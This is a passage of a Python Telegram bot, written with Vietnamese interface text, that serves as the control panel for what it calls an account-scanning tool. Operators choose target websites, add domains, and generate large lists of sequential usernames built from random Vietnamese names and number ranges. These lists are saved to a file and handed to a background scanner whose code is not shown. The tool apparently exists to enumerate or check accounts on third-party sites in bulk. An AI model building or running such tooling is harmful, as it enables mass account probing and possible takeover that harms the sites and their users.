        row_config.append(len(domains) % 3)
    builder.adjust(*row_config)
    
    builder.row(
        types.InlineKeyboardButton(text="☑️ Chọn tất cả", callback_data="domain_select_all"),
        types.InlineKeyboardButton(text="❌ Bỏ chọn hết", callback_data="domain_unselect_all")
    )
    builder.row(
        types.InlineKeyboardButton(text="➕ Thêm Domain", callback_data="add_domain_prompt"),
        types.InlineKeyboardButton(text="💾 Lưu & Thoát", callback_data="back_home")
    )

    await callback.message.edit_text(
        f"🌐 **QUẢN LÝ & CHỌN DOMAIN QUÉT**\n\n"
        f"• Tổng số: **{len(domains)}** | Đang chọn: **{len(selected_scan_domains)}**\n"
        f"*(Chạm vào domain để bật/tắt)*",
        reply_markup=builder.as_markup(),
        parse_mode="Markdown"
    )

@dp.callback_query(lambda c: c.data == "domain_select_all")
async def cb_domain_select_all(callback: types.CallbackQuery):
    await callback.answer("Đã chọn tất cả domain!")
    domains = load_domains()
    global selected_scan_domains
    selected_scan_domains = list(domains)

    builder = InlineKeyboardBuilder()
    for idx, domain in enumerate(domains):
        short_name = domain.replace("m.", "")
        builder.button(text=f"✓ {short_name}", callback_data=f"toggle_domain_{idx}")
    
    row_config = [3] * (len(domains) // 3)
    if len(domains) % 3 > 0:
        row_config.append(len(domains) % 3)
    builder.adjust(*row_config)
    
    builder.row(
        types.InlineKeyboardButton(text="☑️ Chọn tất cả", callback_data="domain_select_all"),
        types.InlineKeyboardButton(text="❌ Bỏ chọn hết", callback_data="domain_unselect_all")
    )
    builder.row(
        types.InlineKeyboardButton(text="➕ Thêm Domain", callback_data="add_domain_prompt"),
        types.InlineKeyboardButton(text="💾 Lưu & Thoát", callback_data="back_home")
    )

    await callback.message.edit_text(
        f"🌐 **QUẢN LÝ & CHỌN DOMAIN QUÉT**\n\n"
        f"• Tổng số: **{len(domains)}** | Đang chọn: **{len(selected_scan_domains)}**\n"
        f"*(Chạm vào domain để bật/tắt)*",
        reply_markup=builder.as_markup(),
        parse_mode="Markdown"
    )

@dp.callback_query(lambda c: c.data == "domain_unselect_all")
async def cb_domain_unselect_all(callback: types.CallbackQuery):
    await callback.answer("Đã bỏ chọn tất cả!")
    domains = load_domains()
    global selected_scan_domains
    selected_scan_domains = []

    builder = InlineKeyboardBuilder()
    for idx, domain in enumerate(domains):
        short_name = domain.replace("m.", "")
        builder.button(text=f"· {short_name}", callback_data=f"toggle_domain_{idx}")
    
    row_config = [3] * (len(domains) // 3)
    if len(domains) % 3 > 0:
        row_config.append(len(domains) % 3)
    builder.adjust(*row_config)
    
    builder.row(
        types.InlineKeyboardButton(text="☑️ Chọn tất cả", callback_data="domain_select_all"),
        types.InlineKeyboardButton(text="❌ Bỏ chọn hết", callback_data="domain_unselect_all")
    )
    builder.row(
        types.InlineKeyboardButton(text="➕ Thêm Domain", callback_data="add_domain_prompt"),
        types.InlineKeyboardButton(text="💾 Lưu & Thoát", callback_data="back_home")
    )

    await callback.message.edit_text(
        f"🌐 **QUẢN LÝ & CHỌN DOMAIN QUÉT**\n\n"
        f"• Tổng số: **{len(domains)}** | Đang chọn: **{len(selected_scan_domains)}**\n"
        f"*(Chạm vào domain để bật/tắt)*",
        reply_markup=builder.as_markup(),
        parse_mode="Markdown"
    )

@dp.callback_query(lambda c: c.data == "add_domain_prompt")
async def cb_add_domain_prompt(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.set_state(FormStates.waiting_for_new_domain)
    await callback.message.answer(
        "➕ **Thêm Domain mới:**\n\n"
        "Hãy gửi tên miền mới vào đây (Ví dụ: `m.domainmoi.com` hoặc `domainmoi.com`)",
        parse_mode="Markdown"
    )

@dp.message(FormStates.waiting_for_new_domain)
async def process_new_domain(message: types.Message, state: FSMContext):
    text = message.text.strip().lower()
    text = text.replace("https://", "").replace("http://", "").split("/")[0]
    
    if not text or "." not in text:
        await message.answer("❌ Tên miền không hợp lệ! Vui lòng nhập lại (Ví dụ: `m.domainmoi.com`)")
        return

    domains = load_domains()
    if text not in domains:
        domains.append(text)
        save_domains(domains)
        global selected_scan_domains
        if selected_scan_domains:
            selected_scan_domains.append(text)
            
        await state.clear()
        await message.answer(
            f"✅ **Thêm domain thành công!**\n"
            f"• Domain mới: `https://{text}`\n"
            f"• Tổng số domain hiện tại: **{len(domains)}**",
            parse_mode="Markdown"
        )
    else:
        await state.clear()
        await message.answer(f"⚠️ Domain `https://{text}` đã có sẵn trong danh sách từ trước!", parse_mode="Markdown")

@dp.callback_query(lambda c: c.data == "back_home")
async def cb_back_home(callback: types.CallbackQuery):
    await callback.answer()
    builder = InlineKeyboardBuilder()
    builder.button(text="⚙️ Tạo danh sách tên ngẫu nhiên mới", callback_data="config_gen")
    builder.button(text="🌐 Chọn Domain quét", callback_data="config_domains")
    builder.button(text="➕ Thêm Domain mới", callback_data="add_domain_prompt")
    builder.button(text="🚀 Bắt đầu quét", callback_data="start_scan")
    builder.button(text="⏹ Dừng lại", callback_data="stop_scan")
    builder.adjust(1)
    
    await callback.message.answer(
        "🤖 **BẢNG ĐIỀU KHIỂN TOOL QUÉT TÀI KHOẢN**\n\n"
        "Chọn chức năng bên dưới:",
        reply_markup=builder.as_markup(),
        parse_mode="Markdown"
    )

@dp.callback_query(lambda c: c.data == "config_gen")
async def cb_config_gen(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    builder = InlineKeyboardBuilder()
    builder.button(text="📌 Kiểu 1: Cố định 1 tên (lamthao1 -> lamthao1000)", callback_data="mode_single_name")
    builder.button(text="🔀 Kiểu 2: Nhiều tên khác nhau (Mỗi tên một dải số)", callback_data="mode_multi_name")
    builder.adjust(1)
    
    await callback.message.answer(
        "📝 **Chọn kiểu tạo tên tài khoản:**\n\n"
        "• **Kiểu 1:** Chỉ chọn 1 tên ngẫu nhiên rồi chạy dải số.\n"
        "• **Kiểu 2:** Nhập số lượng tên gốc khác nhau, mỗi tên sẽ đi kèm dải số của nó.",
        reply_markup=builder.as_markup(),
        parse_mode="Markdown"
    )

@dp.callback_query(lambda c: c.data in ["mode_single_name", "mode_multi_name"])
async def cb_select_mode(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    is_single = (callback.data == "mode_single_name")
    await state.update_data(single_name_mode=is_single)
    await state.set_state(FormStates.waiting_for_range)
    
    if is_single:
        await callback.message.answer(
            "📝 **Nhập dải số cho 1 tên ngẫu nhiên:**\n\n"
            "Gửi tin nhắn theo mẫu:\n"
            "`[Số bắt đầu]-[Số kết thúc]`\n\n"
            "Ví dụ: `1-1000`",
            parse_mode="Markdown"
        )
    else:
        await callback.message.answer(
            "📝 **Nhập số lượng tên ngẫu nhiên và dải số:**\n\n"
            "Gửi tin nhắn theo mẫu:\n"
            "`[Số lượng tên gốc] [Số bắt đầu]-[Số kết thúc]`\n\n"
            "Ví dụ muốn tạo **5 tên gốc khác nhau**, mỗi tên chạy từ `1` đến `200`: \n`5 1-200`",
            parse_mode="Markdown"
        )

@dp.message(FormStates.waiting_for_range)
async def process_custom_range(message: types.Message, state: FSMContext):
    text = message.text.strip()
    data = await state.get_data()
    single_name_mode = data.get("single_name_mode", False)
    
    if single_name_mode:
        match = re.match(r"^(\d+)\s*-\s*(\d+)$", text)
        if not match:
            await message.answer("❌ Định dạng không đúng! Vui lòng nhập lại theo mẫu: `1-1000`", parse_mode="Markdown")
            return
        num_unique = 1
        start_num = int(match.group(1))
        end_num = int(match.group(2))
    else:
        match = re.match(r"^(\d+)\s+(\d+)\s*-\s*(\d+)$", text)
        if not match:
            await message.answer("❌ Định dạng không đúng! Vui lòng nhập lại theo mẫu: `5 1-200`", parse_mode="Markdown")
            return
        num_unique = int(match.group(1))
        start_num = int(match.group(2))
        end_num = int(match.group(3))
    
    if start_num > end_num:
        await message.answer("❌ Số bắt đầu phải nhỏ hơn số kết thúc. Vui lòng nhập lại!")
        return

    selected_names_set = set()
    while len(selected_names_set) < num_unique:
        name = f"{random.choice(HO_DEM_KHONG_DAU)}{random.choice(HO_VA_TEN)}"
        selected_names_set.add(name)
    selected_names = list(selected_names_set)
    
    await state.update_data(
        num_unique_names=num_unique,
        start_num=start_num,
        end_num=end_num,
        selected_names=selected_names
    )
    await state.set_state(FormStates.waiting_for_confirmation)

    preview_sample = selected_names[:5]
    preview_text = "\n".join([f"• `{name}{start_num}` đến `{name}{end_num}`" for name in preview_sample])
    if len(selected_names) > 5:
        preview_text += f"\n• ... và còn {len(selected_names) - 5} tên gốc khác."
    
    builder = InlineKeyboardBuilder()
    builder.button(text="✅ Đồng ý & Lưu file", callback_data="confirm_save")
    builder.button(text="🔄 Đổi tên khác (Random lại)", callback_data="reroll_names")
    builder.adjust(1)

    await message.answer(
        f"👀 **Xem trước danh sách tên ngẫu nhiên (Không trùng lặp):**\n\n"
        f"{preview_text}\n\n"
        f"📦 Tổng số dòng sẽ tạo: **{num_unique * (end_num - start_num + 1):,} dòng**\n"
        f"Bạn thấy đã phù hợp chưa?",
        reply_markup=builder.as_markup(),
        parse_mode="Markdown"
    )

@dp.callback_query(lambda c: c.data == "reroll_names", FormStates.waiting_for_confirmation)
async def cb_reroll_names(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer("Đang đổi tên mới...")
    data = await state.get_data()
    num_unique = data.get("num_unique_names", 1)
    start_num = data.get("start_num", 1)
    end_num = data.get("end_num", 1000)
    
    selected_names_set = set()
    while len(selected_names_set) < num_unique:
        name = f"{random.choice(HO_DEM_KHONG_DAU)}{random.choice(HO_VA_TEN)}"
        selected_names_set.add(name)
    selected_names = list(selected_names_set)
    
    await state.update_data(selected_names=selected_names)

    preview_sample = selected_names[:5]
    preview_text = "\n".join([f"• `{name}{start_num}` đến `{name}{end_num}`" for name in preview_sample])
    if len(selected_names) > 5:
        preview_text += f"\n• ... và còn {len(selected_names) - 5} tên gốc khác."

    builder = InlineKeyboardBuilder()
    builder.button(text="✅ Đồng ý & Lưu file", callback_data="confirm_save")
    builder.button(text="🔄 Đổi tên khác (Random lại)", callback_data="reroll_names")
    builder.adjust(1)

    await callback.message.edit_text(
        f"👀 **Xem trước danh sách tên ngẫu nhiên (Đã đổi & Không trùng):**\n\n"
        f"{preview_text}\n\n"
        f"📦 Tổng số dòng sẽ tạo: **{num_unique * (end_num - start_num + 1):,} dòng**\n"
        f"Bạn thấy đã phù hợp chưa?",
        reply_markup=builder.as_markup(),
        parse_mode="Markdown"
    )

@dp.callback_query(lambda c: c.data == "confirm_save", FormStates.waiting_for_confirmation)
async def cb_confirm_save(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    data = await state.get_data()
    num_unique = data.get("num_unique_names", 1)
    start_num = data.get("start_num", 1)
    end_num = data.get("end_num", 1000)
    single_name_mode = data.get("single_name_mode", False)
    selected_names = data.get("selected_names", [])

    lines = generate_txt_file(num_unique, start_num, end_num, single_name_mode, selected_names)
    await state.clear()

    if lines:
        await callback.message.answer(
            f"✅ **Đã tạo và lưu file `100.txt` thành công!**\n"
            f"📦 Tổng số tài khoản được ghi: **{len(lines):,} dòng**.",
            parse_mode="Markdown"
        )
    else:
        await callback.message.answer("❌ Có lỗi xảy ra khi tạo file!")

@dp.callback_query(lambda c: c.data == "start_scan")
async def cb_start_scan(callback: types.CallbackQuery):
    await callback.answer()
    global is_scanning
    if is_scanning:
        await callback.message.answer("⚠️ Tool đang chạy rồi!")
        return

    threading.Thread(target=run_scanner_task, args=(callback.message.chat.id,), daemon=True).start()
    await callback.message.answer("🚀 **Đã bắt đầu quét tài khoản trên PC theo danh sách hiện tại!**", parse_mode="Markdown")

@dp.callback_query(lambda c: c.data == "stop_scan")
async def cb_stop_scan(callback: types.CallbackQuery):
    await callback.answer()
    global is_scanning
    if not is_scanning:
        await callback.message.answer("⚠️ Tool có đang chạy đâu!")
        return

    is_scanning = False
    await callback.message.answer("⏹ **Đang dừng tiến trình quét...**", parse_mode="Markdown")

async def main():
    log_safe("🤖 Telegram Bot điều khiển đã sẵn sàng hoạt động...", Col.GOLD)
    await dp.start_polling(telegram_bot)

if __name__ == "__main__":
    if sys.platform == "win32": os.system("")
    if hasattr(sys.stdout, 'reconfigure'): sys.stdout.reconfigure(encoding='utf-8')
    import asyncio
    asyncio.run(main())
